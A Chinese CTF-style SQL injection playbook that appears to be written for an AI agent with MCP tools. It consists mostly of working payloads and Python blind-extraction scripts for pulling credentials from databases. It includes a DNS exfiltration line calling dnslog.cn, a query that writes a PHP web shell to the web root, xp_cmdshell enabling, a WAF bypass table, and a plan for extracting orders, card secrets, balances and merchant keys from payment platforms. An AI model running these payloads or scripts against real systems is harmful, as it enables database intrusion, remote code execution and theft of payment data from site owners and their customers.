---
id: "ctf-website/24-database/01-sqli-fundamentals"
title: "SQL Injection Core — SQL 注入基础与全类型覆盖"
title_en: "SQL Injection Core — Fundamentals & Full Type Coverage"
summary: >
  SQL注入经典技术体系：注入点探测与数据库指纹识别、联合查询UNION SELECT数据提取、报错注入（extractvalue/updatexml）、布尔盲注逐字符提取、时间盲注（SLEEP/BENCHMARK/pg_sleep）、文件读写（LOAD_FILE/INTO OUTFILE）以及WAF绕过速查表。
summary_en: >
  Classic SQL injection techniques: injection point detection and database fingerprinting, UNION SELECT data extraction, error-based injection (extractvalue/updatexml), boolean-based blind extraction character by character, time-based blind (SLEEP/BENCHMARK/pg_sleep), file read/write (LOAD_FILE/INTO OUTFILE), and a WAF bypass cheat sheet.
board: "ctf-website"
category: "24-database"
signals:
  - "ORDER BY 列数探测"
  - "UNION SELECT 回显位"
  - "information_schema tables"
  - "extractvalue updatexml 报错"
  - "SLEEP BENCHMARK 时间盲注"
  - "LOAD_FILE 文件读取"
  - "WAF 大小写双写注释绕过"
  - "宽字节 %bf%27 GBK"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "SQL 注入"
  - "UNION SELECT"
  - "报错注入"
  - "布尔盲注"
  - "时间盲注"
  - "information_schema"
  - "WAF 绕过"
  - "LOAD_FILE"
  - "宽字节注入"
  - "extractvalue"
difficulty: "advanced"
tags:
  - "database"
  - "sql-injection"
  - "sqli"
  - "mysql"
  - "waf-bypass"
  - "blind-injection"
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/24-database/02-sqli-advanced", "ctf-website/12-payment/payment-logic", "ctf-website/12-payment/platform-fingerprints"]
---
# SQL Injection Core — SQL 注入基础与全类型覆盖

> 联合查询、报错注入、布尔盲注、时间盲注、文件读写——SQL 注入经典技术体系，附带 WAF 绕过速查表。

## 关键词

`SQL注入` `联合查询` `报错注入` `布尔盲注` `时间盲注` `UNION SELECT` `information_schema` `order by` `load_file` `into outfile` `宽字节` `GBK` `二阶注入` `二次注入`

## 1. 注入点探测

### 1.1 类型识别

```sql
-- 整数型
?id=1'       -- 报错 → 整数型，单引号未过滤
?id=1+0      -- 正常 → 确认整数型

-- 字符串型
?id=1'       -- 无变化 → 可能 addslashes
?id=1%27     -- URL编码单引号
?id=1%bf%27  -- GBK宽字节探测
?id=1%df%27  -- GBK变体
?id=1%2527   -- 二次URL编码

-- 搜索型 (LIKE)
?q=test%'    -- 报错 → LIKE注入
?q=test%25   -- % 编码
```

### 1.2 闭合方式探测

```sql
-- 常见闭合
'       -- 单引号
"       -- 双引号
')      -- 单引号+括号
")      -- 双引号+括号
')--    -- 注释闭合
'))--   -- 双重括号
```

### 1.3 数据库指纹

```sql
-- MySQL
?id=1 AND @@version IS NOT NULL
?id=1 AND SLEEP(3) IS NULL
?id=1 AND CONNECTION_ID() IS NOT NULL

-- PostgreSQL
?id=1 AND pg_sleep(3) IS NULL
?id=1 AND CURRENT_DATABASE() IS NOT NULL

-- MSSQL
?id=1 AND @@version IS NOT NULL
?id=1 AND WAITFOR DELAY '0:0:3'

-- Oracle
?id=1 AND UTL_INADDR.GET_HOST_NAME IS NOT NULL
?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3) IS NOT NULL
```

### 1.4 注入上下文矩阵

同一个参数进 SQL 后可能落在不同语法位置。先判断上下文，再选 payload；不要把 `UNION SELECT` 硬塞进 `ORDER BY`、`LIMIT`、`LIKE` 或 JSON path 里。

| 上下文 | 原始 SQL 形态 | 探测 payload | 命中信号 |
|---|---|---|---|
| 整数条件 | `WHERE id=$id` | `1 AND 1=2` / `1 AND 1=1` | 列表空/正常 |
| 字符串条件 | `WHERE name='$q'` | `' AND '1'='2` | 响应差异或 SQL 报错 |
| LIKE 搜索 | `LIKE '%$q%'` | `%\' AND 1=1-- ` | 搜索结果数量变化 |
| IN 列表 | `id IN ($ids)` | `1) OR 1=1-- ` | 越过列表限制 |
| ORDER BY | `ORDER BY $sort` | `CASE WHEN(1=1) THEN id ELSE name END` | 排序字段变化 |
| LIMIT/OFFSET | `LIMIT $n` | `1 UNION SELECT ...` / `1 OFFSET ...` | 分页数量或报错变化 |
| INSERT | `VALUES ('$v')` | `x'||(SELECT ...)||'` | 写入后展示处触发 |
| JSON 查询 | `JSON_EXTRACT(data,'$.${k}')` | `x') OR 1=1-- ` | JSON 路径错误或结果扩展 |
| Header/Cookie | `WHERE token='$cookie'` | 修改 Cookie 值 | 登录态/权限变化 |

如果只有“错误页变了”但数据不变，先记录 SQL parser 已经接触到 payload；下一步换布尔/时间表达式确认语义执行。

### 1.4.1 上下文自动分类器

CTF 里最浪费时间的是把 payload 打错上下文。先用一组低成本 probe 给参数打标签，再进入对应分支。

```python
# sqli_context_classifier.py — SQL 注入上下文分类
import hashlib
import requests

PROBES = {
    "quote_error": "'",
    "int_bool_true": "1 AND 1=1",
    "int_bool_false": "1 AND 1=2",
    "str_bool_true": "' AND '1'='1",
    "str_bool_false": "' AND '1'='2",
    "like_break": "%' AND '1'='1",
    "order_case": "CASE WHEN(1=1) THEN 1 ELSE 2 END",
    "limit_expr": "1 OFFSET 0",
    "json_path_break": "x') OR 1=1-- ",
}

def sig(resp):
    text = resp.text[:4096]
    return {
        "status": resp.status_code,
        "len": len(resp.text),
        "hash": hashlib.sha256(text.encode(errors="ignore")).hexdigest()[:12],
        "location": resp.headers.get("Location", ""),
    }

def classify_param(url, param="id", baseline="1"):
    s = requests.Session()
    base = sig(s.get(url, params={param: baseline}, timeout=8))
    out = {"baseline": base, "probes": {}}
    for name, payload in PROBES.items():
        r = s.get(url, params={param: payload}, timeout=8, allow_redirects=False)
        out["probes"][name] = sig(r)

    def changed(a):
        return a["status"] != base["status"] or abs(a["len"] - base["len"]) > 80 or a["hash"] != base["hash"]

    hints = []
    if changed(out["probes"]["quote_error"]):
        hints.append("quoted_or_parser_error")
    if changed(out["probes"]["int_bool_false"]) and not changed(out["probes"]["int_bool_true"]):
        hints.append("integer_where")
    if changed(out["probes"]["str_bool_false"]) and not changed(out["probes"]["str_bool_true"]):
        hints.append("string_where")
    if changed(out["probes"]["like_break"]):
        hints.append("like_context")
    if changed(out["probes"]["order_case"]):
        hints.append("order_by_context")
    if changed(out["probes"]["json_path_break"]):
        hints.append("json_path_context")

    out["hints"] = hints or ["unknown_use_time_or_error_probe"]
    return out
```

### 1.5 DBMS 指纹速查矩阵

| DBMS | 版本函数 | 当前库/用户 | 时间函数 | Catalog |
|---|---|---|---|---|
| MySQL/MariaDB | `@@version` | `database()` / `user()` | `SLEEP(3)` | `information_schema.tables` |
| PostgreSQL | `version()` | `current_database()` / `current_user` | `pg_sleep(3)` | `pg_catalog.pg_tables` |
| MSSQL | `@@version` | `DB_NAME()` / `SYSTEM_USER` | `WAITFOR DELAY '0:0:3'` | `sys.tables`, `sys.columns` |
| Oracle | `banner FROM v$version` | `SYS_CONTEXT(...)` | `DBMS_PIPE.RECEIVE_MESSAGE` | `all_tables`, `all_tab_columns` |
| SQLite | `sqlite_version()` | `main` | 笛卡尔积/随机 blob | `sqlite_master` |

对应抽表语句：

```sql
-- MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- PostgreSQL
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- MSSQL
SELECT name FROM sys.tables
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- SQLite
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
```

## 2. 联合查询注入 (UNION)

### 2.1 列数探测

```sql
?id=1 ORDER BY 1--    -- 正常
?id=1 ORDER BY 5--    -- 正常
?id=1 ORDER BY 6--    -- 报错 → 5列
```

### 2.2 回显位探测

```sql
?id=-1 UNION SELECT 1,2,3,4,5--
-- 页面显示 2,3 → 回显位在 2,3
```

### 2.3 数据提取

```sql
-- 数据库名
?id=-1 UNION SELECT 1,database(),3,4,5--

-- 表名 (所有数据库)
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--

-- 列名
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- 数据
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4,5 FROM users--
```

## 3. 报错注入 (Error-based)

### 3.1 MySQL 报错函数

```sql
-- extractvalue (最多32字符)
?id=1 AND extractvalue(1,concat(0x7e,database()))--

-- updatexml
?id=1 AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--

-- exp 溢出 (MySQL 5.5.5+)
?id=1 AND exp(~(SELECT * FROM (SELECT database())a))--

-- 重复键报错 (name_const)
?id=1 AND (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1))a)--

-- BIGINT 溢出 (MySQL 5.5.5 前)
?id=1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3.2 PostgreSQL 报错

```sql
-- CAST 类型转换
?id=1 AND 1=CAST((SELECT version()) AS INT)--
```

### 3.3 MSSQL 报错

```sql
?id=1 AND 1=CONVERT(INT,(SELECT @@version))--
```

## 4. 布尔盲注 (Boolean-based)

### 4.1 逐字符提取

```sql
-- 数据库名长度
?id=1 AND LENGTH(database())=5--

-- 数据库名首字母
?id=1 AND SUBSTR(database(),1,1)='t'--
?id=1 AND ASCII(SUBSTR(database(),1,1))=116--

-- 表名提取
?id=1 AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--
```

### 4.2 使用 LIKE/REGEXP

```sql
?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'a%'--
?id=1 AND (SELECT pass FROM users LIMIT 0,1) REGEXP '^[a-f]'--
```

### 4.3 布尔盲注抽取器

布尔盲注不要线性爆字符，优先二分 ASCII；如果响应长度不稳定，用多个 marker 共同判断。

```python
import requests

TRUE_MARKERS = ["Welcome", "result", "profile"]
FALSE_MARKERS = ["not found", "empty", "0 rows"]

def is_true(resp: requests.Response) -> bool:
    text = resp.text
    if any(m in text for m in TRUE_MARKERS):
        return True
    if any(m in text for m in FALSE_MARKERS):
        return False
    return len(text) > 1200

def boolean_probe(url, template, expr):
    payload = template.replace("§", expr)
    r = requests.get(url, params={"id": payload}, timeout=8)
    return is_true(r)

def extract_ascii(url, template, sql_expr, max_len=64):
    out = []
    for pos in range(1, max_len + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            expr = f"ASCII(SUBSTR(({sql_expr}),{pos},1))>{mid}"
            if boolean_probe(url, template, expr):
                lo = mid + 1
            else:
                hi = mid - 1
        ch = chr(lo)
        if ch == " " and not boolean_probe(url, template, f"LENGTH(({sql_expr}))>={pos}"):
            break
        out.append(ch)
        print("".join(out))
    return "".join(out)

extract_ascii(
    "https://target/item",
    "1 AND (§)-- ",
    "SELECT database()",
)
```

失败样本：True/False 长度随机跳动，说明页面有动态内容；改用固定字段、状态码、跳转位置、特定 DOM 片段或响应哈希去判定。

### 4.4 结果集枚举策略

抽数据时先抽“小而稳定”的元信息，再抽大字段；先定位表名、列名、行数、长度，再逐行分段。不要一上来抽 `GROUP_CONCAT(password)`，很容易被长度、编码和超时截断。

| 目标 | SQL 表达式 | 判断 |
|---|---|---|
| 当前库 | `database()` / `current_database()` | 确认 DBMS 与权限 |
| 表数量 | `COUNT(*) FROM information_schema.tables ...` | 判断枚举规模 |
| 第 N 张表名长度 | `LENGTH((SELECT table_name ... LIMIT N,1))` | 先定长度 |
| 第 N 张表名字符 | `SUBSTR((SELECT table_name ...),pos,1)` | 二分提取 |
| 列名 | `information_schema.columns` | 优先找 `user/pass/token/flag` |
| 行数 | `COUNT(*) FROM target_table` | 判断是否需要分页 |
| 敏感字段长度 | `LENGTH(password)` | 避免超长盲抽 |

```python
# blind_plan.py — 生成盲注抽取任务
INTERESTING_COLUMNS = ["flag", "password", "passwd", "pwd", "token", "secret", "key", "email", "role"]

def table_name_expr(offset, dbms="mysql"):
    if dbms == "mysql":
        return (
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() "
            f"ORDER BY table_name LIMIT {offset},1"
        )
    if dbms == "postgres":
        return (
            "SELECT tablename FROM pg_catalog.pg_tables "
            "WHERE schemaname NOT IN ('pg_catalog','information_schema') "
            f"ORDER BY tablename LIMIT 1 OFFSET {offset}"
        )
    if dbms == "sqlite":
        return f"SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {offset}"
    raise ValueError(dbms)

def column_name_expr(table, offset, dbms="mysql"):
    if dbms in {"mysql", "postgres"}:
        return (
            "SELECT column_name FROM information_schema.columns "
            f"WHERE table_name='{table}' ORDER BY column_name LIMIT {offset},1"
        )
    if dbms == "sqlite":
        return f"SELECT sql FROM sqlite_master WHERE name='{table}'"
    raise ValueError(dbms)
```

## 5. 时间盲注 (Time-based)

### 5.1 MySQL

```sql
-- SLEEP
?id=1 AND SLEEP(3)--
?id=1 AND IF(SUBSTR(database(),1,1)='t',SLEEP(3),0)--

-- BENCHMARK
?id=1 AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)--

-- 笛卡尔积延时
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)=1--
```

### 5.2 PostgreSQL

```sql
?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

### 5.3 MSSQL

```sql
?id=1; IF (1=1) WAITFOR DELAY '0:0:3'--
```

### 5.4 时间盲注抗抖动

时间盲注先采样 baseline，不要只凭一次 3 秒延迟判断。实战里把延迟设成 baseline p95 的 2-3 倍，再做重复投票。

```python
import statistics
import time
import requests

def timed(url, payload):
    t0 = time.perf_counter()
    requests.get(url, params={"id": payload}, timeout=12)
    return time.perf_counter() - t0

def calibrate(url):
    samples = [timed(url, "1") for _ in range(8)]
    return statistics.mean(samples), max(samples)

def time_true(url, template, expr, delay=4, votes=3):
    payload = template.replace("§", f"IF({expr},SLEEP({delay}),0)")
    hits = 0
    for _ in range(votes):
        if timed(url, payload) > delay * 0.75:
            hits += 1
    return hits >= 2
```

命中样本：True 分支稳定超过阈值，False 分支接近 baseline；失败样本：两边都慢，可能是锁等待、WAF 排队、笛卡尔积误伤或网络抖动。

## 6. 文件读写

### 6.1 MySQL

```sql
-- 读取文件 (需 FILE 权限)
?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--

-- DNS OOB 带外注入
?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.cn\\a')))--

-- 写入文件 (需 FILE 权限 + secure_file_priv)
?id=-1 UNION SELECT 1,'<?php system($_GET[1]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
```

### 6.2 MSSQL

```sql
-- xp_cmdshell (需 sysadmin)
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## 7. WAF 绕过

| 技术 | 示例 |
|------|------|
| 大小写 | `SeLeCt` |
| 双写 | `SELSELECTECT` |
| 注释 | `SEL/**/ECT` |
| URL编码 | `%53%45%4C%45%43%54` |
| 内联注释 | `/*!50000SELECT*/` |
| 换行符 | `SEL%0aECT` |
| 制表符 | `SEL%09ECT` |
| 等价函数 | `&&`→`AND`, `\|\|`→`OR` |
| 宽字节 | `%bf%27` (GBK) |
| HPP | `?id=1&id=2 UNION SELECT...` |
| 编码绕过 | `CHAR(115,101,108,101,99,116)` |

## 8. 订单/发卡数据库抽取优先级

SQLi 在支付题里不要平均抽库。先定位能改变业务结果的表：订单、流水、卡密、库存、优惠券、用户余额、回调日志。抽取顺序错了，会浪费大量请求数。

| 目标 | 常见表名 | 关键列 | 命中后的下一步 |
|---|---|---|---|
| 订单主表 | `orders`, `order`, `pay_order`, `trade` | `id`, `out_trade_no`, `status`, `amount`, `user_id` | 对照支付状态机 |
| 支付流水 | `payments`, `pay_log`, `notify_log`, `transactions` | `trade_no`, `pay_type`, `money`, `raw`, `sign` | 转回调/签名文档 |
| 卡密/数字商品 | `cards`, `kami`, `goods_code`, `licenses` | `code`, `secret`, `used`, `order_id` | 判断是否能直接取货 |
| 余额/积分 | `users`, `wallet`, `balance_log` | `balance`, `credit`, `freeze`, `delta` | 找 lost update / negative amount |
| 库存 | `goods`, `sku`, `stock`, `tickets` | `stock`, `sold`, `limit`, `sale_start` | 转抢购/库存竞态 |
| 配置 | `config`, `settings`, `options` | `epay_key`, `notify_url`, `merchant_id` | 转签名密钥/配置泄露 |

### 8.1 表名优先级生成器

```python
# sqli_payment_table_plan.py — 支付题抽表优先级
PAYMENT_HINTS = [
    ("orders", ["order", "trade", "pay_order", "invoice"]),
    ("payment_logs", ["payment", "pay_log", "notify", "callback", "transaction"]),
    ("digital_goods", ["card", "kami", "license", "secret", "coupon"]),
    ("wallet", ["wallet", "balance", "credit", "coin", "points"]),
    ("stock", ["goods", "product", "sku", "stock", "ticket"]),
    ("config", ["config", "setting", "option", "merchant", "epay"]),
]

def rank_tables(table_names):
    rows = []
    for table in table_names:
        low = table.lower()
        hits = [name for name, keys in PAYMENT_HINTS if any(k in low for k in keys)]
        if hits:
            rows.append({"table": table, "priority": hits, "score": len(hits)})
    return sorted(rows, key=lambda x: (-x["score"], x["table"]))

if __name__ == "__main__":
    sample = ["users", "orders", "pay_log", "goods_code", "system_config"]
    for row in rank_tables(sample):
        print(row)
```

### 8.2 低请求数盲注策略

盲注抽支付数据时，先抽结构再抽值：表名 → 列名 → 单条订单/卡密 → 状态差分。常用策略：

| 场景 | 抽取方式 | 目标 |
|---|---|---|
| 有排序差异 | `ORDER BY CASE WHEN (...) THEN id ELSE name END` | 枚举表/列存在性 |
| 有响应长度差异 | `AND EXISTS(SELECT 1 FROM ...)` | 确认业务表 |
| 只有时间通道 | 二分 `ascii(substr(...))` | 抽关键字段而不是整库 |
| 只有报错通道 | `extractvalue/updatexml/cast` | 每次带 20-40 字符 |
| 只有二阶触发 | 写 marker 后触发导出/搜索 | 定位后台 SQL 拼接 |

Evidence 最少要保留三组：`schema_rank.json`、`critical_row_extract.jsonl`、`business_state_diff.json`。SQLi 成功不等于支付链成功，只有订单、余额、卡密、库存或 flag 发生可复查变化，才算链路打通。

## 攻击链 / 工作流

```
1. 枚举所有输入点：URL 参数、POST 表单、Cookie、Header、JSON/XML 字段
2. 用闭合符和布尔表达式确认是否存在 SQL 语义差异
3. 通过报错信息、时间函数或特征语句识别 DBMS 指纹
4. 有回显：走 ORDER BY → UNION 列数 → 回显位 → 表/列/数据提取
5. 无回显：走 Boolean/Time blind，优先提取 database/user/version 等稳定指纹
6. 有文件权限：评估 LOAD_FILE / INTO OUTFILE / xp_cmdshell 等扩展能力
7. 遇到 WAF：记录拦截规则后转入高级绕过文档，避免无序 payload 爆破
8. 支付题优先抽订单/流水/卡密/余额/库存/配置，按状态差分证明结果
```

## Evidence

| 阶段 | 证据 |
|------|------|
| 注入确认 | 原始参数、payload、正常/异常响应差异 |
| DBMS 指纹 | 报错栈、版本函数、时间函数响应 |
| 数据提取 | UNION 回显位、盲注脚本输出、字段样例 |
| 文件读写 | 目标路径、返回内容片段、写入文件哈希 |
| WAF 记录 | 被拦截 payload、状态码、绕过前后对比 |
| 支付链路 | 关键表名、关键行、订单/余额/卡密/库存状态差分 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 SQLi、blind、error-based、union 信号搜索 |
| HTTP 对比 | `http_probe` | 比较 True/False/Time payload 的响应差异 |
| 自动化验证 | `run_ctf_tool` | 调用 sqlmap 或自定义脚本做可控验证 |
| 证据落盘 | `workspace_write_text` | 保存请求响应、payload 与结论 |

## 9. 关联技术

- [[sqli-nosqli]] — SQL/NoSQL 注入
- [[02-sqli-advanced]] — 高级注入技术
- [[06-card-platform]] — 发卡平台实战
- [[04-config-exposure]] — 配置文件读取
